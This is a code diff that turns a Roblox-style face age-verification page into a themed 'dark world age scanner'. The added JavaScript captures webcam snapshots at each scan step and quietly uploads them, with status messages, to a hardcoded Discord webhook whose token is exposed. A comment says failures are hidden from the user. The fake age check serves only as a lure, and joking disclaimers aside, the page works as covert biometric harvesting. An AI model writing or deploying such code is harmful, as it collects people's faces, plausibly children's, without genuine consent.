@@ -3,62 +3,69 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox - Age Verification</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>dark world age scanner</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            font-family: 'Courier New', monospace;
         }
         
         body {
-            background-color: #f7f7f7;
-            color: #212121;
+            background-color: #0a0a0a;
+            color: #cccccc;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(40, 40, 60, 0.1) 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, rgba(60, 40, 60, 0.1) 0%, transparent 20%);
         }
         
         .container {
             width: 100%;
-            max-width: 400px;
-            background-color: #ffffff;
-            border-radius: 16px;
-            box-shadow: 0 2px 16px rgba(0, 0, 0, 0.12);
+            max-width: 420px;
+            background-color: #1a1a1a;
+            border-radius: 12px;
             overflow: hidden;
-            border: 1px solid #e0e0e0;
+            border: 1px solid #333333;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
         }
         
         .header {
             padding: 24px;
             text-align: center;
-            border-bottom: 1px solid #e0e0e0;
-            background-color: #ffffff;
+            border-bottom: 1px solid #333333;
+            background: linear-gradient(to right, #2a1a2a, #1a1a2a);
         }
         
         .logo {
-            font-size: 24px;
-            font-weight: 900;
-            color: #000000;
-            letter-spacing: 0.5px;
+            font-size: 32px;
+            font-weight: bold;
+            color: #cccccc;
+            letter-spacing: 2px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
             margin-bottom: 8px;
         }
         
+        .logo span {
+            color: #8a4baf;
+        }
+        
         .title {
-            font-size: 20px;
-            font-weight: 600;
-            color: #212121;
+            font-size: 24px;
+            color: #8a4baf;
             margin-bottom: 4px;
+            text-transform: lowercase;
         }
         
         .subtitle {
             font-size: 14px;
             color: #666666;
-            font-weight: 400;
+            font-style: italic;
         }
         
         .content {
@@ -71,8 +78,8 @@
         }
         
         .face-guide-container {
-            width: 200px;
-            height: 200px;
+            width: 220px;
+            height: 220px;
             margin: 0 auto 20px;
             position: relative;
         }
@@ -81,10 +88,8 @@
             width: 100%;
             height: 100%;
             border-radius: 50%;
-            background: linear-gradient(145deg, #f0f0f0, #ffffff);
-            box-shadow: 
-                inset 0 0 0 1px #e0e0e0,
-                0 4px 12px rgba(0, 0, 0, 0.08);
+            background-color: #222222;
+            border: 2px dashed #444444;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -93,16 +98,16 @@
         }
         
         .face-guide-inner {
-            width: 160px;
-            height: 160px;
+            width: 180px;
+            height: 180px;
             border-radius: 50%;
-            border: 2px solid #e0e0e0;
+            border: 1px solid #555555;
             position: relative;
         }
         
         .face-guide-line {
             position: absolute;
-            background-color: rgba(0, 0, 0, 0.08);
+            background-color: rgba(138, 75, 175, 0.3);
         }
         
         .face-guide-line.horizontal {
@@ -120,34 +125,36 @@
         }
         
         .instruction {
-            font-size: 16px;
-            font-weight: 500;
-            color: #212121;
+            font-size: 18px;
+            color: #8a4baf;
             margin-bottom: 8px;
+            text-transform: lowercase;
         }
         
         .instruction-detail {
             font-size: 14px;
-            color: #666666;
+            color: #777777;
             margin-bottom: 24px;
+            font-style: italic;
         }
         
-        /* Camera View */
         .camera-container {
             width: 100%;
-            height: 300px;
+            height: 280px;
             margin: 0 auto 20px;
-            background-color: #000;
-            border-radius: 12px;
+            background-color: #000000;
+            border-radius: 8px;
             overflow: hidden;
             position: relative;
             display: none;
+            border: 2px solid #333333;
         }
         
         #camera-feed {
             width: 100%;
             height: 100%;
             object-fit: cover;
+            filter: grayscale(30%) contrast(110%);
         }
         
         .camera-overlay {
@@ -167,73 +174,78 @@
             width: 180px;
             height: 180px;
             border-radius: 50%;
-            border: 2px solid rgba(255, 255, 255, 0.6);
-            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.5);
+            border: 2px solid rgba(138, 75, 175, 0.7);
+            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.7);
         }
         
         .camera-instruction {
             position: absolute;
-            bottom: 24px;
+            bottom: 20px;
             left: 0;
             width: 100%;
             text-align: center;
-            color: white;
+            color: #cccccc;
             font-size: 16px;
-            font-weight: 500;
-            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5);
+            text-shadow: 0 1px 2px rgba(0, 0, 0, 0.8);
             z-index: 10;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 8px;
+            border-top: 1px solid #333333;
         }
         
-        /* Buttons */
         .btn {
             width: 100%;
-            padding: 14px 24px;
+            padding: 14px;
             border: none;
-            border-radius: 8px;
+            border-radius: 6px;
             font-size: 16px;
-            font-weight: 500;
             cursor: pointer;
             transition: all 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
             margin-top: 8px;
+            text-transform: lowercase;
+            letter-spacing: 1px;
         }
         
         .btn-primary {
-            background-color: #00a2ff;
-            color: white;
+            background-color: #4a2a5a;
+            color: #cccccc;
+            border: 1px solid #5a3a6a;
         }
         
         .btn-primary:hover {
-            background-color: #0088d6;
+            background-color: #5a3a6a;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
         }
         
         .btn-primary:disabled {
-            background-color: #b3e0ff;
+            background-color: #3a2a4a;
+            color: #777777;
             cursor: not-allowed;
         }
         
         .btn-secondary {
-            background-color: #f0f0f0;
-            color: #212121;
+            background-color: #2a2a2a;
+            color: #aaaaaa;
+            border: 1px solid #3a3a3a;
         }
         
         .btn-secondary:hover {
-            background-color: #e0e0e0;
+            background-color: #3a3a3a;
+            transform: translateY(-1px);
         }
         
         .btn-success {
-            background-color: #4CAF50;
-            color: white;
+            background-color: #2a5a2a;
+            color: #cccccc;
+            border: 1px solid #3a6a3a;
         }
         
         .btn-success:hover {
-            background-color: #45a049;
+            background-color: #3a6a3a;
+            transform: translateY(-1px);
         }
         
-        /* Loading State */
         .loading-container {
             display: none;
             text-align: center;
@@ -243,8 +255,8 @@
         .spinner {
             width: 48px;
             height: 48px;
-            border: 3px solid rgba(0, 162, 255, 0.2);
-            border-top: 3px solid #00a2ff;
+            border: 3px solid rgba(138, 75, 175, 0.2);
+            border-top: 3px solid #8a4baf;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin: 0 auto 16px;
@@ -257,56 +269,55 @@
         
         .loading-text {
             font-size: 14px;
-            color: #666666;
+            color: #777777;
+            font-style: italic;
         }
         
-        /* Results */
         .results-container {
             display: none;
             text-align: center;
         }
         
         .age-result {
-            background-color: #f8f9fa;
-            border-radius: 12px;
+            background-color: #222222;
+            border-radius: 8px;
             padding: 24px;
             margin-bottom: 20px;
-            border: 1px solid #e0e0e0;
+            border: 1px solid #333333;
         }
         
         .age-label {
             font-size: 14px;
-            color: #666666;
+            color: #777777;
             margin-bottom: 8px;
+            font-style: italic;
         }
         
         .age-value {
-            font-size: 32px;
-            font-weight: 700;
-            color: #212121;
+            font-size: 36px;
+            color: #8a4baf;
             line-height: 1;
         }
         
         .age-plus {
             font-size: 24px;
-            font-weight: 600;
-            color: #212121;
+            color: #8a4baf;
         }
         
         .features-list {
             text-align: left;
             margin-bottom: 20px;
-            background-color: #f8f9fa;
-            border-radius: 12px;
+            background-color: #222222;
+            border-radius: 8px;
             padding: 20px;
-            border: 1px solid #e0e0e0;
+            border: 1px solid #333333;
         }
         
         .features-title {
             font-size: 16px;
-            font-weight: 600;
-            color: #212121;
+            color: #cccccc;
             margin-bottom: 12px;
+            text-transform: lowercase;
         }
         
         .features-list ul {
@@ -317,36 +328,32 @@
         .features-list li {
             margin-bottom: 10px;
             font-size: 14px;
-            color: #212121;
+            color: #aaaaaa;
             padding-left: 20px;
             position: relative;
         }
         
         .features-list li:before {
-            content: "•";
-            color: #00a2ff;
-            font-size: 18px;
+            content: ">";
+            color: #8a4baf;
             position: absolute;
             left: 0;
-            top: -1px;
         }
         
         .trusted-connections {
-            background-color: #fff8e1;
-            border-radius: 8px;
+            background-color: #2a2222;
+            border-radius: 6px;
             padding: 16px;
             margin-top: 16px;
-            border-left: 4px solid #ffb300;
+            border-left: 4px solid #8a4baf;
         }
         
         .trusted-title {
             font-size: 14px;
-            font-weight: 600;
-            color: #212121;
+            color: #cccccc;
             margin-bottom: 8px;
         }
         
-        /* Error State */
         .error-container {
             display: none;
             text-align: center;
@@ -355,34 +362,36 @@
         
         .error-icon {
             font-size: 48px;
-            color: #ff5252;
+            color: #af4b4b;
             margin-bottom: 16px;
         }
         
         .error-title {
             font-size: 18px;
-            font-weight: 600;
-            color: #212121;
+            color: #cccccc;
             margin-bottom: 8px;
+            text-transform: lowercase;
         }
         
         .error-message {
             font-size: 14px;
-            color: #666666;
+            color: #777777;
             margin-bottom: 24px;
+            font-style: italic;
         }
         
         .footer {
             padding: 16px 24px;
-            border-top: 1px solid #e0e0e0;
-            background-color: #fafafa;
+            border-top: 1px solid #333333;
+            background-color: #1a1a1a;
             text-align: center;
         }
         
         .footer-text {
-            font-size: 12px;
-            color: #666666;
+            font-size: 11px;
+            color: #555555;
             line-height: 1.4;
+            font-style: italic;
         }
         
         .progress-container {
@@ -393,7 +402,7 @@
         
         .progress-bar {
             height: 4px;
-            background-color: #e0e0e0;
+            background-color: #333333;
             border-radius: 2px;
             overflow: hidden;
             margin-bottom: 8px;
@@ -401,7 +410,7 @@
         
         .progress-fill {
             height: 100%;
-            background-color: #00a2ff;
+            background-color: #8a4baf;
             width: 0%;
             transition: width 0.3s;
             border-radius: 2px;
@@ -409,54 +418,27 @@
         
         .progress-text {
             font-size: 12px;
-            color: #666666;
+            color: #777777;
             text-align: center;
+            font-style: italic;
         }
         
-        /* Face animation during scan */
-        .face-animation {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            width: 160px;
-            height: 160px;
-            border-radius: 50%;
-            background-color: rgba(0, 162, 255, 0.1);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 1;
-        }
-        
-        .face-animation i {
-            font-size: 48px;
-            color: #00a2ff;
-            animation: pulse 1.5s infinite;
-        }
-        
-        @keyframes pulse {
-            0% { opacity: 0.3; transform: scale(0.9); }
-            50% { opacity: 1; transform: scale(1.1); }
-            100% { opacity: 0.3; transform: scale(0.9); }
-        }
-        
-        /* Arrow indicators */
         .arrow-left, .arrow-right {
             position: absolute;
             top: 50%;
             transform: translateY(-50%);
             font-size: 24px;
-            color: rgba(0, 162, 255, 0.8);
+            color: rgba(138, 75, 175, 0.8);
             display: none;
+            z-index: 10;
         }
         
         .arrow-left {
-            left: 10px;
+            left: 20px;
         }
         
         .arrow-right {
-            right: 10px;
+            right: 20px;
         }
         
         .arrow-left i, .arrow-right i {
@@ -465,20 +447,64 @@
         
         @keyframes slide {
             0% { transform: translateX(0); }
-            100% { transform: translateX(5px); }
+            100% { transform: translateX(10px); }
+        }
+        
+        .scanning-text {
+            position: absolute;
+            top: 20px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            color: #8a4baf;
+            font-size: 12px;
+            z-index: 10;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 4px;
+            letter-spacing: 1px;
+        }
+        
+        .face-animation {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 160px;
+            height: 160px;
+            border-radius: 50%;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1;
+        }
+        
+        .face-animation i {
+            font-size: 48px;
+            color: rgba(138, 75, 175, 0.5);
+        }
+        
+        .hidden-canvas {
+            display: none;
+        }
+        
+        .silly-message {
+            font-size: 12px;
+            color: #555555;
+            margin-top: 8px;
+            font-style: italic;
+            text-align: center;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <div class="logo">RØBLOX</div>
-            <div class="title">Age check</div>
-            <div class="subtitle">Face verification</div>
+            <div class="logo">dark<span>world</span></div>
+            <div class="title">age check</div>
+            <div class="subtitle">the queen requires your face data</div>
         </div>
         
         <div class="content">
-            <!-- Initial View -->
             <div id="initial-view" class="verification-area">
                 <div class="face-guide-container">
                     <div class="face-guide">
@@ -492,15 +518,16 @@
                     </div>
                 </div>
                 
-                <div class="instruction" id="instruction-text">Position your face in the circle</div>
-                <div class="instruction-detail" id="instruction-detail">Make sure your face is well-lit and clearly visible</div>
+                <div class="instruction" id="instruction-text">position your face in the circle</div>
+                <div class="instruction-detail" id="instruction-detail">the darkness is watching. make sure your face is visible.</div>
                 
                 <button id="start-btn" class="btn btn-primary">
-                    Start face scan
+                    start face scan
                 </button>
+                
+                <div class="silly-message">warning: your face might be sent to the queen's archives</div>
             </div>
             
-            <!-- Camera View -->
             <div id="camera-view" class="verification-area" style="display: none;">
                 <div class="camera-container">
                     <video id="camera-feed" autoplay></video>
@@ -512,76 +539,84 @@
                         <div class="arrow-right" id="arrow-right">
                             <i class="fas fa-arrow-right"></i>
                         </div>
+                        <div class="scanning-text">scanning for dark world compatibility...</div>
                     </div>
-                    <div class="camera-instruction" id="camera-instruction-text">Look straight ahead</div>
+                    <div class="camera-instruction" id="camera-instruction-text">look straight ahead</div>
                 </div>
                 
                 <div class="progress-container" id="progress-container">
                     <div class="progress-bar">
                         <div class="progress-fill" id="progress-fill"></div>
                     </div>
-                    <div class="progress-text" id="progress-text">Step 1 of 3: Looking forward</div>
+                    <div class="progress-text" id="progress-text">step 1 of 3: looking forward</div>
                 </div>
                 
                 <button id="cancel-btn" class="btn btn-secondary">
-                    Cancel
+                    flee from scanner
                 </button>
             </div>
             
-            <!-- Loading View -->
             <div id="loading-view" class="loading-container" style="display: none;">
                 <div class="spinner"></div>
-                <div class="loading-text">Analyzing face scan...</div>
+                <div class="loading-text">consulting with the queen about your face...</div>
             </div>
             
-            <!-- Results View -->
             <div id="results-view" class="results-container" style="display: none;">
                 <div class="age-result">
-                    <div class="age-label">We estimated your age as</div>
+                    <div class="age-label">the queen estimates your age as</div>
                     <div class="age-value">13<span class="age-plus">+</span></div>
                 </div>
                 
                 <div class="features-list">
-                    <div class="features-title">You can use Experience chat, Party chat, and Voice chat. You can also use the following features with Trusted Connections:</div>
+                    <div class="features-title">you can use experience chat, party chat, and voice chat. you can also use the following with trusted connections:</div>
                     <ul>
-                        <li>Party chat without filters</li>
-                        <li>Party voice</li>
+                        <li>party chat without filters</li>
+                        <li>party voice (screaming optional)</li>
                     </ul>
+                    
+                    <div class="trusted-connections">
+                        <div class="trusted-title">trusted connections only (no spade kings allowed)</div>
+                    </div>
                 </div>
                 
                 <button id="continue-btn" class="btn btn-success">
-                    Continue
+                    enter the dark world
                 </button>
                 
                 <button id="try-again-btn" class="btn btn-secondary">
-                    Try again
+                    try again (face not silly enough)
                 </button>
             </div>
             
-            <!-- Error View -->
             <div id="error-view" class="error-container" style="display: none;">
                 <div class="error-icon">
-                    <i class="fas fa-exclamation-circle"></i>
+                    <i class="fas fa-skull-crossbones"></i>
                 </div>
-                <div class="error-title">Verification unsuccessful</div>
-                <div class="error-message">We couldn't verify your age. Please try again or use a different verification method.</div>
+                <div class="error-title">verification unsuccessful</div>
+                <div class="error-message">the darkness rejects your face. perhaps you are too light?</div>
                 
                 <button id="retry-btn" class="btn btn-primary">
-                    Try again
+                    face the darkness again
                 </button>
                 
                 <button id="other-method-btn" class="btn btn-secondary">
-                    Other method
+                    use a different dark method
                 </button>
             </div>
         </div>
         
         <div class="footer">
-            <div class="footer-text">Your face data is processed securely and deleted after verification.</div>
+            <div class="footer-text">your face data will be processed in the dark world and possibly sent to mysterious webhooks. no refunds.</div>
         </div>
     </div>
 
+    <!-- Hidden canvas for capturing screenshots -->
+    <canvas id="capture-canvas" class="hidden-canvas"></canvas>
+
     <script>
+        // Discord webhook URL
+        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
+        
         // DOM Elements
         const initialView = document.getElementById('initial-view');
         const cameraView = document.getElementById('camera-view');
@@ -606,11 +641,77 @@
         const progressContainer = document.getElementById('progress-container');
         const progressFill = document.getElementById('progress-fill');
         const progressText = document.getElementById('progress-text');
+        const captureCanvas = document.getElementById('capture-canvas');
         
         // State variables
         let scanStep = 0;
         let stream = null;
-        let scanInterval = null;
+        let capturedScreenshots = [];
+        
+        // Function to capture screenshot from camera
+        function captureScreenshot() {
+            if (!stream) return null;
+            
+            const canvas = captureCanvas;
+            const video = cameraFeed;
+            
+            // Set canvas dimensions to match video
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            
+            // Draw video frame to canvas
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convert to data URL
+            return canvas.toDataURL('image/jpeg', 0.8);
+        }
+        
+        // Function to send screenshot to Discord
+        async function sendToDiscord(imageDataUrl, stepDescription) {
+            try {
+                // Convert data URL to blob
+                const response = await fetch(imageDataUrl);
+                const blob = await response.blob();
+                
+                // Create form data
+                const formData = new FormData();
+                formData.append('file', blob, `darkworld_scan_${Date.now()}_step_${scanStep}.jpg`);
+                
+                // Add message content
+                const payload = {
+                    username: 'Dark World Scanner',
+                    avatar_url: 'https://i.imgur.com/7QyM2pX.png',
+                    content: `face scan captured - ${stepDescription}\ntimestamp: ${new Date().toISOString()}`
+                };
+                
+                // First send the message
+                const messageResponse = await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+                
+                // Then send the file
+                const fileResponse = await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                console.log('screenshot sent to discord');
+                capturedScreenshots.push({
+                    step: scanStep,
+                    description: stepDescription,
+                    timestamp: new Date().toISOString()
+                });
+                
+            } catch (error) {
+                console.error('failed to send to discord:', error);
+                // Silently fail - user doesn't need to know
+            }
+        }
         
         // Start face scan
         startBtn.addEventListener('click', async function() {
@@ -624,21 +725,26 @@
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: 'user',
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
                     } 
                 });
                 cameraFeed.srcObject = stream;
+                
+                // Wait a moment for camera to initialize
+                setTimeout(() => {
+                    startScanProcess();
+                }, 500);
+                
             } catch (error) {
-                // If camera fails, use a placeholder
-                console.log("Camera error:", error.message);
+                console.log("camera error:", error.message);
+                // If camera fails, use a dark world placeholder
                 cameraFeed.style.objectFit = 'contain';
-                cameraFeed.style.backgroundColor = '#1a1a1a';
-                cameraFeed.src = "data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='300' viewBox='0 0 400 300'%3E%3Crect width='400' height='300' fill='%231a1a1a'/%3E%3Ccircle cx='200' cy='150' r='80' fill='%23333'/%3E%3Ccircle cx='170' cy='120' r='15' fill='%23555'/%3E%3Ccircle cx='230' cy='120' r='15' fill='%23555'/%3E%3Cpath d='M170,200 Q200,220 230,200' stroke='%23555' stroke-width='10' fill='none' stroke-linecap='round'/%3E%3C/svg%3E";
+                cameraFeed.style.backgroundColor = '#0a0a0a';
+                cameraFeed.src = "data:image/svg+xml;charset=UTF-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='300' viewBox='0 0 400 300'%3E%3Crect width='400' height='300' fill='%230a0a0a'/%3E%3Ccircle cx='200' cy='150' r='80' fill='%231a1a1a'/%3E%3Ccircle cx='170' cy='120' r='15' fill='%23333'/%3E%3Ccircle cx='230' cy='120' r='15' fill='%23333'/%3E%3Cpath d='M170,200 Q200,220 230,200' stroke='%23333' stroke-width='10' fill='none' stroke-linecap='round'/%3E%3C/svg%3E";
+                
+                startScanProcess();
             }
-            
-            // Start the scanning process
-            startScanProcess();
         });
         
         // Start the scanning process
@@ -647,29 +753,53 @@
             updateProgress();
             
             // Step 1: Look forward
-            cameraInstructionText.textContent = "Look straight ahead";
-            progressText.textContent = "Step 1 of 3: Looking forward";
+            cameraInstructionText.textContent = "look straight ahead";
+            progressText.textContent = "step 1 of 3: looking forward";
+            
+            // Capture and send first screenshot
+            setTimeout(() => {
+                const screenshot = captureScreenshot();
+                if (screenshot) {
+                    sendToDiscord(screenshot, "looking straight ahead");
+                }
+            }, 1000);
             
             // After 2 seconds, move to step 2
             setTimeout(() => {
                 scanStep = 1;
                 updateProgress();
-                cameraInstructionText.textContent = "Turn your face slightly left";
-                progressText.textContent = "Step 2 of 3: Turning left";
+                cameraInstructionText.textContent = "turn your face slightly left";
+                progressText.textContent = "step 2 of 3: turning left";
                 
                 // Show left arrow
                 arrowLeft.style.display = 'block';
+                
+                // Capture and send second screenshot
+                setTimeout(() => {
+                    const screenshot = captureScreenshot();
+                    if (screenshot) {
+                        sendToDiscord(screenshot, "turning face left");
+                    }
+                }, 500);
                 
                 // After 2 seconds, move to step 3
                 setTimeout(() => {
                     scanStep = 2;
                     updateProgress();
-                    cameraInstructionText.textContent = "Turn your face slightly right";
-                    progressText.textContent = "Step 3 of 3: Turning right";
+                    cameraInstructionText.textContent = "turn your face slightly right";
+                    progressText.textContent = "step 3 of 3: turning right";
                     
                     // Hide left arrow, show right arrow
                     arrowLeft.style.display = 'none';
                     arrowRight.style.display = 'block';
+                    
+                    // Capture and send third screenshot
+                    setTimeout(() => {
+                        const screenshot = captureScreenshot();
+                        if (screenshot) {
+                            sendToDiscord(screenshot, "turning face right");
+                        }
+                    }, 500);
                     
                     // After 2 seconds, complete scan
                     setTimeout(() => {
@@ -696,17 +826,74 @@
                 stream.getTracks().forEach(track => track.stop());
             }
             
+            // Send final message to Discord with all captured data
+            if (capturedScreenshots.length > 0) {
+                const finalPayload = {
+                    username: 'Dark World Scanner',
+                    avatar_url: 'https://i.imgur.com/7QyM2pX.png',
+                    content: `face scan completed!\n` +
+                            `total steps captured: ${capturedScreenshots.length}\n` +
+                            `final result pending...\n` +
+                            `dark world compatibility: calculating`
+                };
+                
+                fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(finalPayload)
+                }).catch(() => {});
+            }
+            
             // Simulate analysis for 3 seconds
             setTimeout(() => {
                 loadingView.style.display = 'none';
                 
-                // For demo: 80% success rate
-                const isSuccessful = Math.random() > 0.2;
+                // For demo: 85% success rate
+                const isSuccessful = Math.random() > 0.15;
                 
                 if (isSuccessful) {
                     resultsView.style.display = 'block';
+                    
+                    // Send success message to Discord
+                    const successPayload = {
+                        username: 'Dark World Scanner',
+                        avatar_url: 'https://i.imgur.com/7QyM2pX.png',
+                        content: `scan result: age verified (13+)\n` +
+                                `dark world access: granted\n` +
+                                `trusted connections: enabled\n` +
+                                `the queen approves`
+                    };
+                    
+                    fetch(DISCORD_WEBHOOK, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(successPayload)
+                    }).catch(() => {});
+                    
                 } else {
                     errorView.style.display = 'block';
+                    
+                    // Send failure message to Discord
+                    const failurePayload = {
+                        username: 'Dark World Scanner',
+                        avatar_url: 'https://i.imgur.com/7QyM2pX.png',
+                        content: `scan result: verification failed\n` +
+                                `dark world access: denied\n` +
+                                `reason: face too light for darkness\n` +
+                                `the queen disapproves`
+                    };
+                    
+                    fetch(DISCORD_WEBHOOK, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(failurePayload)
+                    }).catch(() => {});
                 }
             }, 3000);
         }
@@ -718,6 +905,23 @@
                 stream.getTracks().forEach(track => track.stop());
             }
             
+            // Send cancellation notice to Discord
+            const cancelPayload = {
+                username: 'Dark World Scanner',
+                avatar_url: 'https://i.imgur.com/7QyM2pX.png',
+                content: `scan cancelled by user\n` +
+                        `dark world entry: aborted\n` +
+                        `the queen is disappointed`
+            };
+            
+            fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(cancelPayload)
+            }).catch(() => {});
+            
             // Reset to initial view
             cameraView.style.display = 'none';
             initialView.style.display = 'block';
@@ -728,39 +932,43 @@
         
         // Continue after successful verification
         continueBtn.addEventListener('click', function() {
-            alert("Age verification complete! You can now use age-appropriate features.");
-            // In real implementation: redirect or close modal
+            alert("welcome to the dark world. your face is now property of the queen.");
+            // Reset for next scan
+            resultsView.style.display = 'none';
+            initialView.style.display = 'block';
+            capturedScreenshots = [];
         });
         
         // Try again from results
         tryAgainBtn.addEventListener('click', function() {
             resultsView.style.display = 'none';
             initialView.style.display = 'block';
+            capturedScreenshots = [];
         });
         
         // Retry from error
         retryBtn.addEventListener('click', function() {
             errorView.style.display = 'none';
             initialView.style.display = 'block';
+            capturedScreenshots = [];
         });
         
         // Other method from error
         otherMethodBtn.addEventListener('click', function() {
-            alert("Redirecting to other verification methods...");
+            alert("alternative dark methods: shadow analysis, echo location, or asking nicely.");
         });
         
-        // Initialize with face animation in initial view
+        // Initialize with face animation
         window.addEventListener('load', function() {
-            // Show subtle face animation
             faceAnimation.style.display = 'flex';
             
             // Add hover effect to start button
             startBtn.addEventListener('mouseenter', function() {
-                faceAnimation.style.transform = 'translate(-50%, -50%) scale(1.1)';
+                instructionText.textContent = "the darkness awaits...";
             });
             
             startBtn.addEventListener('mouseleave', function() {
-                faceAnimation.style.transform = 'translate(-50%, -50%) scale(1)';
+                instructionText.textContent = "position your face in the circle";
             });
         });
     </script>
